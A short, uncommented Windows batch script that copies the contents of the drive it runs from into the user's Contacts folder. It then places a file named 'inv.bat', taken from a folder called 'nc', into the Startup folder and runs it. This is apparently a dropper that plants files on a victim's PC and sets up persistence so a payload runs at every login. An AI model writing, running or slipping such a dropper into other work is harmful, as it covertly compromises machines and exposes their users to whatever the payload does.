@echo off
color a
xcopy %CD:~0,3%* C:\Users\%USERNAME%\Contacts /e /i
copy "%CD:~0,3%nc\inv.bat" "%SystemDrive%\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
inv.bat
